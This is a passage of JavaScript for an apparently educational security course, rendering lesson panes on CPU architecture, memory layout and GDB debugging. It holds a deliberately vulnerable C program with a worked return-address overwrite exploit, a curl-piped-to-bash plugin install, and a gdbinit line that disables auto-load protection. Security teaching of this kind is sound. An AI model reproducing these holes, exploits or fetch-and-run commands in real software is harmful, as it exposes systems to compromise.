                <button class="demo-btn demo-btn-sm active" data-t="alu">ALU</button>
                <button class="demo-btn demo-btn-sm" data-t="cu">Control Unit</button>
                <button class="demo-btn demo-btn-sm" data-t="cache">Cache Hierarchy</button>
            </div>
            <div id="cpuCompOut" style="background:#1e1e1e;color:#4ec9b0;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            alu: 'ARITHMETIC LOGIC UNIT (ALU):\n\nThe computational engine of the CPU\n\n        ┌─────────────────┐\n        │   OPERAND A     │\n        └────────┬────────┘\n                 │\n        ┌────────▼────────┐\n   OP ─▶│      ALU        │──▶ FLAGS\n        │   ┌─────────┐   │    (Zero, Carry,\n        │   │ Add/Sub │   │     Overflow, Sign)\n        │   │ AND/OR  │   │\n        │   │ XOR/NOT │   │\n        │   │ Shift   │   │\n        │   └─────────┘   │\n        └────────┬────────┘\n                 │\n        ┌────────▼────────┐\n        │    RESULT       │\n        └─────────────────┘\n\n⚠️ Security: Overflow bugs exploit ALU behavior!',
            cu: 'CONTROL UNIT (CU):\n\nOrchestrates all CPU operations\n\n┌─────────────────────────────────────┐\n│          CONTROL UNIT               │\n├─────────────────────────────────────┤\n│                                     │\n│  ┌─────────────────────────────┐    │\n│  │   Instruction Decoder       │    │\n│  │   - Parses opcode           │    │\n│  │   - Identifies operands     │    │\n│  └─────────────────────────────┘    │\n│                                     │\n│  ┌─────────────────────────────┐    │\n│  │   Timing & Control          │    │\n│  │   - Clock synchronization   │    │\n│  │   - Pipeline management     │    │\n│  └─────────────────────────────┘    │\n│                                     │\n│  ┌─────────────────────────────┐    │\n│  │   Signal Generator          │    │\n│  │   - Routes data to units    │    │\n│  │   - Controls ALU operation  │    │\n│  └─────────────────────────────┘    │\n└─────────────────────────────────────┘',
            cache: 'CACHE HIERARCHY:\n\nFast memory close to CPU cores\n\n┌─────────────────────────────────────┐\n│             CPU DIE                 │\n├─────────────────────────────────────┤\n│  ┌─────────┐   ┌─────────────────┐  │\n│  │ Core 0  │   │    L3 Cache     │  │\n│  │┌───────┐│   │    (Shared)     │  │\n│  ││ L1 D  ││   │    8-64 MB      │  │\n│  ││ 32KB  ││   │   ~40 cycles    │  │\n│  │├───────┤│   └─────────────────┘  │\n│  ││ L1 I  ││                        │\n│  ││ 32KB  ││   Speed Comparison:    │\n│  │├───────┤│   L1: ~4 cycles        │\n│  ││  L2   ││   L2: ~12 cycles       │\n│  ││ 256KB ││   L3: ~40 cycles       │\n│  │└───────┘│   RAM: ~200 cycles     │\n│  └─────────┘                        │\n└─────────────────────────────────────┘\n\n🔒 Security: Cache timing attacks (Spectre/Meltdown)!'
        };
        $('#cpuCompOut').textContent = data.alu;
        $$('#cpuCompTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#cpuCompTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#cpuCompOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 3: cpu-registers - CPU Registers Deep Dive
    function demoCPURegisters(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">CPU Registers Deep Dive</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="regTabs">
                <button class="demo-btn demo-btn-sm active" data-t="gpr">General Purpose</button>
                <button class="demo-btn demo-btn-sm" data-t="special">Special Registers</button>
                <button class="demo-btn demo-btn-sm" data-t="flags">Flags Register</button>
            </div>
            <div id="regOut" style="background:#1e1e1e;color:#dcdcaa;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            gpr: 'x86-64 GENERAL PURPOSE REGISTERS:\n\n64-bit    32-bit   16-bit   8-bit\n┌────────┬────────┬────────┬────────┐\n│  RAX   │  EAX   │   AX   │ AH/AL  │ Accumulator\n│  RBX   │  EBX   │   BX   │ BH/BL  │ Base\n│  RCX   │  ECX   │   CX   │ CH/CL  │ Counter\n│  RDX   │  EDX   │   DX   │ DH/DL  │ Data\n│  RSI   │  ESI   │   SI   │  SIL   │ Source Index\n│  RDI   │  EDI   │   DI   │  DIL   │ Dest Index\n├────────┴────────┴────────┴────────┤\n│  R8-R15: Additional 64-bit regs   │\n│  R8D-R15D: 32-bit portions        │\n│  R8W-R15W: 16-bit portions        │\n│  R8B-R15B: 8-bit portions         │\n└───────────────────────────────────┘\n\n💡 Calling Convention: RDI, RSI, RDX, RCX, R8, R9 = args',
            special: 'SPECIAL REGISTERS:\n\n┌──────────┬─────────────────────────────┐\n│ Register │ Purpose                     │\n├──────────┼─────────────────────────────┤\n│   RIP    │ Instruction Pointer         │\n│          │ Address of NEXT instruction │\n│          │ ⚠️ Control = Code Execution │\n├──────────┼─────────────────────────────┤\n│   RSP    │ Stack Pointer               │\n│          │ Top of current stack        │\n│          │ ⚠️ Overflow attacks target  │\n├──────────┼─────────────────────────────┤\n│   RBP    │ Base Pointer                │\n│          │ Stack frame reference       │\n│          │ Used for local variables    │\n├──────────┼─────────────────────────────┤\n│  RFLAGS  │ Status & Control Flags      │\n│          │ Condition codes for jumps   │\n└──────────┴─────────────────────────────┘\n\n🔴 RIP control = Remote Code Execution!',
            flags: 'RFLAGS REGISTER (Status Flags):\n\nBit 63            Bit 0\n ▼                  ▼\n┌─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┬─┐\n│?│?│?│O│D│I│T│S│Z│?│?│C│\n└─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┴─┘\n         │ │ │ │ │ │     │\n         │ │ │ │ │ │     └─ CF: Carry Flag\n         │ │ │ │ │ └─ ZF: Zero Flag\n         │ │ │ │ └─ SF: Sign Flag\n         │ │ │ └─ TF: Trap Flag (debug)\n         │ │ └─ IF: Interrupt Enable\n         │ └─ DF: Direction Flag\n         └─ OF: Overflow Flag\n\nConditional Jumps:\n  JZ/JE  - Jump if Zero (ZF=1)\n  JNZ/JNE - Jump if Not Zero (ZF=0)\n  JG/JL  - Jump if Greater/Less (signed)\n  JA/JB  - Jump if Above/Below (unsigned)'
        };
        $('#regOut').textContent = data.gpr;
        $$('#regTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#regTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#regOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 4: fetch-decode-execute - Fetch-Decode-Execute Cycle
    function demoFetchDecodeExecute(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Fetch-Decode-Execute Cycle</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="fdeTabs">
                <button class="demo-btn demo-btn-sm active" data-t="fetch">1. Fetch</button>
                <button class="demo-btn demo-btn-sm" data-t="decode">2. Decode</button>
                <button class="demo-btn demo-btn-sm" data-t="execute">3. Execute</button>
                <button class="demo-btn demo-btn-sm" data-t="pipeline">Pipelining</button>
            </div>
            <div id="fdeOut" style="background:#1e1e1e;color:#ce9178;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            fetch: 'FETCH STAGE:\n\nRead instruction from memory into CPU\n\n    Memory                    CPU\n    ┌──────────┐         ┌───────────┐\n    │ 0x1000:  │         │    RIP    │\n    │ mov eax, │◀────────│  0x1000   │\n    │ 5        │         └───────────┘\n    ├──────────┤               │\n    │ 0x1005:  │               │\n    │ add eax, │               ▼\n    │ 3        │         ┌───────────┐\n    ├──────────┤         │ Instruction│\n    │ 0x100A:  │         │  Register │\n    │ ret      │         │ "mov eax" │\n    └──────────┘         └───────────┘\n\n1. RIP contains address of next instruction\n2. CPU reads bytes from that address\n3. Instruction placed in Instruction Register\n4. RIP incremented for next cycle',
            decode: 'DECODE STAGE:\n\nParse instruction into operations\n\nInstruction: "mov eax, 5" (B8 05 00 00 00)\n\n┌─────────────────────────────────────┐\n│         INSTRUCTION DECODER         │\n├─────────────────────────────────────┤\n│  Opcode: B8 = MOV to EAX            │\n│  Operand: 05 00 00 00 = 5 (little)  │\n├─────────────────────────────────────┤\n│  DECODED OPERATION:                 │\n│  ┌──────────────────────────────┐   │\n│  │ Operation: MOVE              │   │\n│  │ Source: Immediate value 5    │   │\n│  │ Destination: EAX register    │   │\n│  │ Size: 32-bit                 │   │\n│  └──────────────────────────────┘   │\n└─────────────────────────────────────┘\n\nControl unit generates signals for:\n- ALU operation type\n- Register selection\n- Memory access if needed',
            execute: 'EXECUTE STAGE:\n\nPerform the decoded operation\n\n┌─────────────────────────────────────┐\n│          EXECUTION UNIT             │\n├─────────────────────────────────────┤\n│                                     │\n│  mov eax, 5:                        │\n│  ┌─────────────────────────────┐    │\n│  │ EAX  ←  5                   │    │\n│  │ (Write value to register)   │    │\n│  └─────────────────────────────┘    │\n│                                     │\n│  add eax, 3:                        │\n│  ┌─────────────────────────────┐    │\n│  │ EAX  ←  EAX + 3             │    │\n│  │ (ALU adds, stores result)   │    │\n│  │ Update flags: ZF, SF, OF    │    │\n│  └─────────────────────────────┘    │\n│                                     │\n│  WRITEBACK: Result stored to dest   │\n└─────────────────────────────────────┘',
            pipeline: 'INSTRUCTION PIPELINING:\n\nExecute multiple instructions in parallel stages\n\nTime →   T1    T2    T3    T4    T5    T6\n┌─────────────────────────────────────────┐\n│Instr 1: [F]  [D]  [E]                   │\n│Instr 2:      [F]  [D]  [E]              │\n│Instr 3:           [F]  [D]  [E]         │\n│Instr 4:                [F]  [D]  [E]    │\n└─────────────────────────────────────────┘\nF=Fetch, D=Decode, E=Execute\n\n✅ Benefit: 1 instruction completes per cycle\n\n⚠️ PIPELINE HAZARDS (Security relevant!):\n• Data hazard: Need result from prev instruction\n• Control hazard: Branch prediction (Spectre!)\n• Speculative execution can leak data!\n\n🔴 Spectre/Meltdown exploit pipeline behavior'
        };
        $('#fdeOut').textContent = data.fetch;
        $$('#fdeTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#fdeTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#fdeOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 5: stack-and-heap - Stack and Heap Memory
    function demoStackAndHeap(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">INTERACTIVE</span><span class="demo-title">Stack and Heap Memory</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="memTabs">
                <button class="demo-btn demo-btn-sm active" data-t="layout">Memory Layout</button>
                <button class="demo-btn demo-btn-sm" data-t="stack">Stack Operations</button>
                <button class="demo-btn demo-btn-sm" data-t="heap">Heap Operations</button>
                <button class="demo-btn demo-btn-sm" data-t="vuln">Vulnerabilities</button>
            </div>
            <div id="memOut" style="background:#1e1e1e;color:#ff6b6b;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            layout: 'PROCESS MEMORY LAYOUT:\n\n     High Memory (0x7FFF...)\n    ┌─────────────────────┐\n    │   STACK             │ ← RSP points here\n    │   ↓ grows down      │   Local vars, return addrs\n    │                     │\n    ├─────────────────────┤\n    │   (unmapped)        │ ← Guard pages\n    ├─────────────────────┤\n    │                     │\n    │   ↑ grows up        │\n    │   HEAP              │ ← malloc/new allocations\n    ├─────────────────────┤\n    │   .bss              │ ← Uninitialized globals\n    ├─────────────────────┤\n    │   .data             │ ← Initialized globals\n    ├─────────────────────┤\n    │   .text             │ ← Program code (RX)\n    └─────────────────────┘\n     Low Memory (0x0000...)',
            stack: 'STACK OPERATIONS:\n\nFunction call creates stack frame:\n\nvoid func(int a, int b) {\n    char buf[16];\n    int x = 5;\n}\n\n    High addresses\n    ┌─────────────────┐\n    │  Return Address │ ← ⚠️ ATTACKER TARGET!\n    ├─────────────────┤\n    │   Saved RBP     │ ← Previous frame pointer\n    ├─────────────────┤\n    │   buf[16]       │ ← Local buffer\n    │   ............  │   (overflow here overwrites\n    │   ............  │    return address!)\n    ├─────────────────┤\n    │   x = 5         │ ← Local variable\n    └─────────────────┘ ← RSP (top of stack)\n    Low addresses\n\n⚠️ Buffer overflow can overwrite return address!',
            heap: 'HEAP MEMORY MANAGEMENT:\n\nDynamic allocation at runtime:\n\nchar *ptr = malloc(64);  // Allocate\nfree(ptr);               // Deallocate\n\nHEAP STRUCTURE (simplified):\n┌────────────────────────────────────┐\n│  CHUNK HEADER                      │\n│  ├─ Size (including header)        │\n│  ├─ Flags (in-use, prev-in-use)    │\n│  └─ Forward/Back pointers (free)   │\n├────────────────────────────────────┤\n│  USER DATA (64 bytes)              │\n│  └─ Your malloc\'d memory           │\n├────────────────────────────────────┤\n│  NEXT CHUNK...                     │\n└────────────────────────────────────┘\n\n⚠️ HEAP EXPLOITS:\n• Use-After-Free: Access freed memory\n• Double-Free: Free same chunk twice\n• Heap Overflow: Corrupt adjacent chunks',
            vuln: 'MEMORY CORRUPTION VULNERABILITIES:\n\n1. STACK BUFFER OVERFLOW:\n   char buf[16];\n   strcpy(buf, "AAAA...x64bytes...");  // Overwrites ret!\n\n2. HEAP OVERFLOW:\n   char *p = malloc(16);\n   memcpy(p, data, 64);  // Corrupts heap metadata\n\n3. USE-AFTER-FREE:\n   free(ptr);\n   *ptr = malicious;  // Freed memory reused!\n\n4. FORMAT STRING:\n   printf(user_input);  // %n writes to memory!\n\n┌─────────────────────────────────────┐\n│        EXPLOIT PRIMITIVES           │\n├─────────────────────────────────────┤\n│ Write-What-Where: Arbitrary write   │\n│ Info Leak: Read memory addresses    │\n│ RIP Control: Hijack execution       │\n└─────────────────────────────────────┘\n\n🛡️ Mitigations: ASLR, Stack Canaries, DEP/NX'
        };
        $('#memOut').textContent = data.layout;
        $$('#memTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#memTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#memOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility for demoCPUArch
    function demoCPUArch(pane) { demoCPUArchIntro(pane); }

    // C8 Lesson 6: tracking-execution - Tracking Program Execution
    function demoTrackingExecution(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">INTERACTIVE</span><span class="demo-title">Tracking Program Execution</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="trackTabs">
                <button class="demo-btn demo-btn-sm active" data-t="why">Why Track?</button>
                <button class="demo-btn demo-btn-sm" data-t="tools">Tracking Tools</button>
                <button class="demo-btn demo-btn-sm" data-t="breakpoints">Breakpoints</button>
            </div>
            <div id="trackOut" style="background:#1a1a1a;color:#00ff00;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            why: 'WHY TRACK PROGRAM EXECUTION?\n\n┌─────────────────────────────────────┐\n│      SECURITY ANALYSIS USES         │\n├─────────────────────────────────────┤\n│                                     │\n│ 🔍 Vulnerability Research:          │\n│    • Find crash points              │\n│    • Identify input handling bugs   │\n│    • Map code coverage              │\n│                                     │\n│ 🦠 Malware Analysis:                │\n│    • Understand malicious behavior  │\n│    • Find C2 communication          │\n│    • Identify evasion techniques    │\n│                                     │\n│ 🔧 Exploit Development:             │\n│    • Find useful gadgets (ROP)      │\n│    • Track memory corruption        │\n│    • Verify exploit reliability     │\n│                                     │\n│ 🐛 Bug Hunting:                     │\n│    • Reproduce crashes              │\n│    • Root cause analysis            │\n│    • Patch verification             │\n└─────────────────────────────────────┘',
            tools: 'EXECUTION TRACKING TOOLS:\n\n┌──────────────┬──────────────────────┐\n│ Tool         │ Use Case             │\n├──────────────┼──────────────────────┤\n│ GDB          │ Source-level debug   │\n│ LLDB         │ macOS debugging      │\n│ WinDbg       │ Windows kernel/user  │\n│ x64dbg       │ Windows user mode    │\n│ radare2/r2   │ Reverse engineering  │\n│ IDA Pro      │ Static + dynamic     │\n│ Ghidra       │ NSA decompiler       │\n├──────────────┼──────────────────────┤\n│ strace       │ System call tracing  │\n│ ltrace       │ Library call tracing │\n│ dtrace       │ Dynamic tracing      │\n│ perf         │ Performance analysis │\n└──────────────┴──────────────────────┘\n\n$ strace ./program\nexecve("./program", ...) = 0\nopen("/etc/passwd", O_RDONLY) = 3\nread(3, "root:x:0:0:...", 4096) = 2048',
            breakpoints: 'BREAKPOINT TYPES:\n\nSoftware Breakpoints:\n  • Replace instruction with INT 3 (0xCC)\n  • CPU traps, debugger takes control\n  • Can set unlimited number\n\nHardware Breakpoints:\n  • Use CPU debug registers (DR0-DR3)\n  • Limited to 4 on x86\n  • Can break on read/write/execute\n\n┌─────────────────────────────────────┐\n│ Memory at 0x401156 (before):        │\n│  48 89 e5  mov rbp, rsp             │\n├─────────────────────────────────────┤\n│ Memory at 0x401156 (after break):   │\n│  CC 89 e5  INT 3 (trap)             │\n└─────────────────────────────────────┘\n\n(gdb) break *0x401156\n(gdb) watch *0x7fffffffe000    # HW break on write\n(gdb) rwatch *0x7fffffffe000   # HW break on read'
        };
        $('#trackOut').textContent = data.why;
        $$('#trackTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#trackTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#trackOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 7: gdb-setup - GDB Setup & Configuration
    function demoGDBSetup(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">INTERACTIVE</span><span class="demo-title">GDB Setup & Configuration</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="gdbSetupTabs">
                <button class="demo-btn demo-btn-sm active" data-t="install">Installation</button>
                <button class="demo-btn demo-btn-sm" data-t="gdbinit">GDB Init</button>
                <button class="demo-btn demo-btn-sm" data-t="peda">GDB Plugins</button>
            </div>
            <div id="gdbSetupOut" style="background:#1a1a1a;color:#00ff88;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            install: 'GDB INSTALLATION:\n\n# Ubuntu/Debian:\n$ sudo apt install gdb gdb-multiarch\n\n# Fedora/RHEL:\n$ sudo dnf install gdb\n\n# macOS (use LLDB instead):\n$ lldb ./program\n\n# Verify installation:\n$ gdb --version\nGNU gdb (Ubuntu 12.1-0ubuntu1) 12.1\n\n# Compile with debug symbols:\n$ gcc -g -O0 program.c -o program\n     │  └── No optimization (easier debug)\n     └── Include debug symbols\n\n# Check for debug info:\n$ file program\nprogram: ELF 64-bit, with debug_info\n$ readelf --debug-dump=info program | head',
            gdbinit: '~/.gdbinit CONFIGURATION:\n\n# Disable paging for large output\nset pagination off\n\n# Enable command history\nset history save on\nset history filename ~/.gdb_history\nset history size 10000\n\n# Intel syntax (vs AT&T)\nset disassembly-flavor intel\n\n# Follow fork behavior\nset follow-fork-mode child\n\n# Pretty printing\nset print pretty on\nset print array on\n\n# Disable address randomization for debugging\nset disable-randomization on\n\n# Auto-load scripts\nset auto-load safe-path /\n\n# Add source directories\ndirectory /path/to/source',
            peda: 'GDB ENHANCEMENT PLUGINS:\n\n┌──────────────────────────────────────┐\n│ PEDA - Python Exploit Dev Assist    │\n├──────────────────────────────────────┤\n│ $ git clone https://github.com/     │\n│   longld/peda.git ~/peda            │\n│ $ echo "source ~/peda/peda.py"      │\n│   >> ~/.gdbinit                     │\n└──────────────────────────────────────┘\n\n┌──────────────────────────────────────┐\n│ GEF - GDB Enhanced Features          │\n├──────────────────────────────────────┤\n│ $ bash -c "$(curl -fsSL            │\n│   https://gef.blah.cat/sh)"         │\n│                                      │\n│ Features: heap analysis, ROP finder, │\n│ memory maps, pattern create/search   │\n└──────────────────────────────────────┘\n\n┌──────────────────────────────────────┐\n│ pwndbg - CTF & Exploit Plugin        │\n├──────────────────────────────────────┤\n│ $ git clone https://github.com/      │\n│   pwndbg/pwndbg                      │\n│ $ cd pwndbg && ./setup.sh            │\n└──────────────────────────────────────┘'
        };
        $('#gdbSetupOut').textContent = data.install;
        $$('#gdbSetupTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#gdbSetupTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#gdbSetupOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 8: debugging-techniques - Advanced Debugging Techniques
    function demoDebuggingTechniques(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">INTERACTIVE</span><span class="demo-title">Advanced Debugging Techniques</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="debugTabs">
                <button class="demo-btn demo-btn-sm active" data-t="memory">Memory Exam</button>
                <button class="demo-btn demo-btn-sm" data-t="disasm">Disassembly</button>
                <button class="demo-btn demo-btn-sm" data-t="modify">Modify Runtime</button>
            </div>
            <div id="debugOut" style="background:#1a1a1a;color:#ff9500;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            memory: 'MEMORY EXAMINATION (x command):\n\nFormat: x/[count][format][size] address\n\n(gdb) x/20x $rsp        # 20 hex words at RSP\n0x7fffe570: 0x00000000 0x00000000 0x41414141 0x41414141\n0x7fffe580: 0x41414141 0x41414141 0x00401234 0x00000000\n\n(gdb) x/s $rdi          # String at RDI\n0x7fffe590: "Hello, World!"\n\n(gdb) x/10i $rip        # 10 instructions at RIP\n0x40117a: mov    eax,0x0\n0x40117f: call   0x401050 <printf@plt>\n\nFORMATS:          SIZES:\n  x - hex           b - byte (1)\n  d - decimal       h - halfword (2)\n  u - unsigned      w - word (4)\n  s - string        g - giant (8)\n  i - instruction\n  c - char',
            disasm: 'DISASSEMBLY TECHNIQUES:\n\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x401146 <+0>:   push   rbp\n   0x401147 <+1>:   mov    rbp,rsp\n   0x40114a <+4>:   sub    rsp,0x50\n=> 0x40114e <+8>:   lea    rax,[rbp-0x40]\n   0x401152 <+12>:  mov    rdi,rax\n   0x401155 <+15>:  call   0x401050 <gets@plt>\n   0x40115a <+20>:  leave\n   0x40115b <+21>:  ret\n\n(gdb) disassemble /r main    # Show raw bytes\n   0x401146 <+0>:   55                push   rbp\n   0x401147 <+1>:   48 89 e5          mov    rbp,rsp\n   0x40114a <+4>:   48 83 ec 50       sub    rsp,0x50\n\n(gdb) x/20i $rip-10    # Examine around current point',
            modify: 'RUNTIME MODIFICATION:\n\n# Modify register values:\n(gdb) set $rax = 0x41414141\n(gdb) set $rip = 0x401200   # Change execution!\n\n# Modify memory:\n(gdb) set {int}0x7fffe580 = 0xdeadbeef\n(gdb) set {char[20]}0x7fffe590 = "pwned!"\n\n# Skip function calls:\n(gdb) set $rip = $rip + 5   # Skip current instr\n\n# Call functions directly:\n(gdb) call (int)puts("Hello from GDB!")\nHello from GDB!\n$1 = 17\n\n# Patch binary in memory:\n(gdb) set {unsigned char}0x40115a = 0x90  # NOP\n\n⚠️ ANTI-DEBUGGING DETECTION:\nMalware checks: ptrace, /proc/self/status,\nChecksum verification, timing attacks\n\n(gdb) catch syscall ptrace   # Catch anti-debug'
        };
        $('#debugOut').textContent = data.memory;
        $$('#debugTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#debugTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#debugOut').textContent = data[b.dataset.t];
            };
        });
    }

    // C8 Lesson 9: debugging-challenge - Debugging Challenge Lab
    function demoDebuggingChallenge(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-danger">CHALLENGE</span><span class="demo-title">Debugging Challenge Lab</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="challTabs">
                <button class="demo-btn demo-btn-sm active" data-t="scenario">Scenario</button>
                <button class="demo-btn demo-btn-sm" data-t="analysis">Analysis</button>
                <button class="demo-btn demo-btn-sm" data-t="solution">Solution</button>
            </div>
            <div id="challOut" style="background:#1a1a1a;color:#ff6b6b;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            scenario: 'DEBUG CHALLENGE: FIND THE VULNERABILITY\n\n// vulnerable.c\n#include <stdio.h>\n#include <string.h>\n\nvoid secret() {\n    printf("You found the secret!\\n");\n    system("/bin/sh");\n}\n\nvoid echo() {\n    char buf[64];\n    printf("Enter text: ");\n    gets(buf);           // ⚠️ Dangerous!\n    printf("You said: %s\\n", buf);\n}\n\nint main() {\n    echo();\n    return 0;\n}\n\n$ gcc -fno-stack-protector -no-pie \\\n      -g vulnerable.c -o vulnerable\n\nCHALLENGE: Use GDB to exploit and reach secret()',
            analysis: 'GDB ANALYSIS:\n\n(gdb) info functions\n0x0000000000401156  secret\n0x0000000000401186  echo\n0x00000000004011c6  main\n\n(gdb) break echo\n(gdb) run\n(gdb) disassemble echo\n   0x401186 <+0>:  push   rbp\n   0x401187 <+1>:  mov    rbp,rsp\n   0x40118a <+4>:  sub    rsp,0x40     ← 64 byte buffer\n   ...\n   0x4011c3 <+61>: leave\n   0x4011c4 <+62>: ret                 ← Return address!\n\n(gdb) x/20x $rbp\n0x7fffffffe5e0: [saved RBP] [return addr]\n               ↑           ↑\n          offset 64    offset 72\n\nBuffer starts at RBP-0x40 (64 bytes)\nSaved RBP at RBP+0\nReturn address at RBP+8',
            solution: 'EXPLOIT DEVELOPMENT:\n\nStep 1: Calculate offset to return address\n  Buffer: 64 bytes\n  Saved RBP: 8 bytes\n  TOTAL: 72 bytes to reach return addr\n\nStep 2: Find address of secret()\n  (gdb) print &secret\n  $1 = 0x401156\n\nStep 3: Create exploit payload\n  $ python3 -c \'\n  import struct\n  padding = b"A" * 72\n  secret = struct.pack("<Q", 0x401156)\n  print((padding + secret).decode("latin-1"))\n  \' | ./vulnerable\n\nStep 4: Verify in GDB\n  (gdb) run < <(python3 -c \'...\')\n  You said: AAAA...\n  You found the secret!\n  $\n\n🎉 Successfully redirected execution to secret()!'
        };
        $('#challOut').textContent = data.scenario;
        $$('#challTabs .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#challTabs .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#challOut').textContent = data[b.dataset.t];
            };
        });
    }

    // Backward compatibility for demoGDB
    function demoGDB(pane) { demoGDBSetup(pane); }

    // C8 Lesson 10: adv-storage-intro - Advanced Storage Introduction
    function demoAdvStorageIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">INTERACTIVE</span><span class="demo-title">Advanced Storage Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="storageTabs">
                <button class="demo-btn demo-btn-sm active" data-t="types">Storage Types</button>
                <button class="demo-btn demo-btn-sm" data-t="interfaces">Interfaces</button>
                <button class="demo-btn demo-btn-sm" data-t="forensics">Forensic Impact</button>
            </div>
            <div id="storageOut" style="background:#1e1e1e;color:#d4d4d4;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            types: 'STORAGE TECHNOLOGY TYPES:\n\n┌───────────────┬──────────────────────────┐\n│ Type          │ Characteristics          │\n├───────────────┼──────────────────────────┤\n│ HDD           │ Magnetic platters        │\n│               │ 7200/5400 RPM            │\n│               │ Cheap, high capacity     │\n│               │ ⚠️ Data recoverable!     │\n├───────────────┼──────────────────────────┤\n│ SSD           │ Flash memory (NAND)      │\n│               │ No moving parts          │\n│               │ Fast, expensive          │\n│               │ ⚠️ TRIM complicates     │\n│               │   forensic recovery      │\n├───────────────┼──────────────────────────┤\n│ NVMe          │ PCIe direct connection   │\n│               │ Fastest consumer option  │\n│               │ M.2 / U.2 form factors   │\n└───────────────┴──────────────────────────┘',
